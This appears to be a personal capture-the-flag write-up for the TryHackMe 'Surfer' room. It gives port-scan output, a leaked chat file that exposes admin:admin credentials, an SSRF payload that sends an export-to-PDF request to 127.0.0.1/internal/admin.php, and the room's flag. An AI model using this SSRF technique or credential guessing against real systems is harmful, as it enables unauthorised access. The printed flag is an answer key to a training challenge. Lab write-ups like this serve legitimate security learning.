----
Surf some internal webpages to find the flag!
----

![222](https://tryhackme-images.s3.amazonaws.com/room-icons/6924475c1dc389f44b230968c782d984.png)

### Surfer

 Start Machine

Woah, check out this radical app! Isn't it narly dude? We've been surfing through some webpages and we want to get you on board too! They said this application has some functionality that is only available for internal usage -- but if you catch the right wave, you can probably find the sweet stuff!

  

Access this challenge by deploying both the vulnerable machine by pressing the green "Start Machine" button located within this task, and the TryHackMe AttackBox by pressing the  "Start AttackBox" button located at the top-right of the page.

Navigate to the following URL using the AttackBox: [HTTP://10.10.64.91](http://10.10.64.91/)

  

Check out similar content on TryHackMe:

-   [SSRF](https://tryhackme.com/room/ssrfqi)

Answer the questions below

```
┌──(witty㉿kali)-[~/Downloads]
└─$ rustscan -a 10.10.64.91 --ulimit 5500 -b 65535 -- -A -Pn
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
Real hackers hack time ⌛

[~] The config file is expected to be at "/home/witty/.rustscan.toml"
[~] Automatically increasing ulimit value to 5500.
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
Open 10.10.64.91:22
Open 10.10.64.91:80
[~] Starting Script(s)
[>] Script to be run Some("nmap -vvv -p {{port}} {{ip}}")

Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
[~] Starting Nmap 7.93 ( https://nmap.org ) at 2023-04-21 12:49 EDT
NSE: Loaded 155 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 12:50
Completed NSE at 12:50, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 12:50
Completed NSE at 12:50, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 12:50
Completed NSE at 12:50, 0.00s elapsed
Initiating Parallel DNS resolution of 1 host. at 12:50
Completed Parallel DNS resolution of 1 host. at 12:50, 0.29s elapsed
DNS resolution of 1 IPs took 0.31s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating Connect Scan at 12:50
Scanning 10.10.64.91 [2 ports]
Discovered open port 22/tcp on 10.10.64.91
Discovered open port 80/tcp on 10.10.64.91
Completed Connect Scan at 12:50, 0.19s elapsed (2 total ports)
Initiating Service scan at 12:50
Scanning 2 services on 10.10.64.91
Completed Service scan at 12:50, 6.73s elapsed (2 services on 1 host)
NSE: Script scanning 10.10.64.91.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 12:50
Completed NSE at 12:50, 9.50s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 12:50
Completed NSE at 12:50, 1.48s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 12:50
Completed NSE at 12:50, 0.00s elapsed
Nmap scan report for 10.10.64.91
Host is up, received user-set (0.19s latency).
Scanned at 2023-04-21 12:50:02 EDT for 18s

PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 3639d8a1271f3bd470833cb33f566daf (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCha4jCQUtEYHVgFdnbYiRRMyucxbgfVxSCqLS8yUBMFNwcNJ8tyD7wuQFehWlPAFqnkbDdptQc6iQo6q90lRJLMjoGn/SdNNIA298NsF1IStmST1FEGDbgC2zVLK05LacV9+Ri7enP/WcexPJKovQpGjPHD2mRWZOBC6Wvv4P8g92SIAlvba9/l/TCsJar8qaHNKdJrfRWUz2TMmHHZW3mQx0uq1b8LWeZwfjdoXHhvhdsI9sgUf8QwzgVJvEd2aWVaRe5DEBhTQgnFLp3paJERoGw/FcP2vPbIaPHHNdCFeusYUlo3gOOpMmkzeAYy3Ulv3A5wUVkKWjOUNrpCE0/AXHAweAGjNPQWWymJrilzBhes2XibBKdjBG5MLZhTvKrxG8vuPaaXwFu6KFsOoNBjiuZyhGYfqQBU6XutUGLsPV4w9CTpaMxy/kLve7PL+19dMoDeAn7i/m8PbFYX136IITJZ8QCuGcuLXGmy4V+mk4hynNd9tUClbdI8Jy/c40=
|   256 625257d44ef3cf007d87766599aad6f9 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBMbA8seeyLVLBO73Iq7PbgM8TK+BAiu82WIZUMg5HeUS9o/N0N5XjZ4DyqFydLrIWZlVeYC+edfxJGhw8+YEDtU=
|   256 ae10bb5f290dd3a906cc26f0f01a4eda (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIOO0T3XYKyRM3qFxv5a/HylTLTkK5ZgyN360w3tBtEh9
80/tcp open  http    syn-ack Apache httpd 2.4.38 ((Debian))
|_http-favicon: Unknown favicon MD5: CFFCD51EFA49AB1AC1D8AC6E36462235
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-server-header: Apache/2.4.38 (Debian)
| http-title: 24X7 System+
|_Requested resource was /login.php
| http-robots.txt: 1 disallowed entry 
|_/backup/chat.txt
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 12:50
Completed NSE at 12:50, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 12:50
Completed NSE at 12:50, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 12:50
Completed NSE at 12:50, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 24.22 seconds

http://10.10.64.91/backup/chat.txt

Admin: I have finished setting up the new export2pdf tool.
Kate: Thanks, we will require daily system reports in pdf format.
Admin: Yes, I am updated about that.
Kate: Have you finished adding the internal server.
Admin: Yes, it should be serving flag from now.
Kate: Also Don't forget to change the creds, plz stop using your username as password.
Kate: Hello.. ?

admin:admin

http://10.10.64.91/internal/admin.php

This page can only be accessed locally. (SSRF)

http://10.10.64.91/export2pdf.php

Report generated for http://127.0.0.1/server-info.php

intercept with burp and change to

url=http%3A%2F%2F127.0.0.1%2Finternal%2Fadmin.php

Report generated for http://127.0.0.1/internal/admin.php
flag{6255c55660e292cf0116c053c9937810}

```

Uncover the flag on the hidden application page.

![[Pasted image 20230421115431.png]]
![[Pasted image 20230421115858.png]]
![[Pasted image 20230421120023.png]]

*flag{6255c55660e292cf0116c053c9937810}*


[[SQHell]]